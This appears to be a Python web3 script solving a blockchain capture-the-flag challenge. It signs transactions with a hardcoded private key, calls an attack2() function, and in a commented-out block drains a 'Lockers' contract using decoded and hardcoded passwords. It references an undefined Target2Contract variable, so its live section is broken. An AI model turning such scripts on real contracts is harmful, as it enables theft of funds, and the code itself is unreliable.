from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files

x = {
    "PrivateKey": "0xfb9cf98df166a3899be2ffa728ee2010632abea2ef13e6e0c2a9750bbd2d92ef",
    "Address": "0x26180ff7418463743197e972cF826B6f7d54CBaF",
    "TargetAddress": "0x905e79bf459D32674ead7E5ee2A6C9780C80b2c8",
    "setupAddress": "0x20D9cef066f238061dbe2Bbf32bbe08683d2716A"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://157.245.37.125:30037/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = TargetContract
balance = w3.eth.get_balance(account_address)
print(balance)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

install_solc("0.8.13")

'''
#block_number = 38
block = w3.eth.get_block(block_number)

# Check if the block exists
if block is not None:
    # Access block information
    block_hash = block['hash']
    block_timestamp = block['timestamp']
    block_transactions = block['transactions']

    print(f"Block Number: {block_number}")
    print(f"Block Hash: {block_hash}")
    print(f"Block Timestamp: {block_timestamp}")

    # Retrieve and print transaction details for each transaction in the block
    for tx_hash in block_transactions:
        #tx = w3.eth.get_transaction_receipt(tx_hash)
        tx = w3.eth.get_transaction(tx_hash)
        if tx is not None:
            print(tx)
else:
    print(f"Block {block_number} not found.")
'''

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Contract.sol:Contract']['abi']

contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
construct_txn = contract_instance2.functions.attack2().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


'''
compiled = compile_files(["Lockers.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Lockers.sol:Lockers']['abi']
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

owner = bytes.fromhex('62656c6965667370616365').decode()
name = bytes.fromhex('57697a6172647353636570746572').decode()
password = bytes.fromhex('737334234e71376e4e794b4d665a3d5845536e4f7a5032686b3a535352437a6f3251506b34777e7e').decode()


vendor = 'V3nd0r'
#password2 = ''
password2 = 'P455_w0rD$$&&88@!~'

construct_txn = contract_instance2.functions.getLocker(vendor, password2).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

construct_txn = contract_instance2.functions.transferItem(name, vendor, password).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

construct_txn = contract_instance2.functions.sellItem(name, password2).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
'''
compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
#
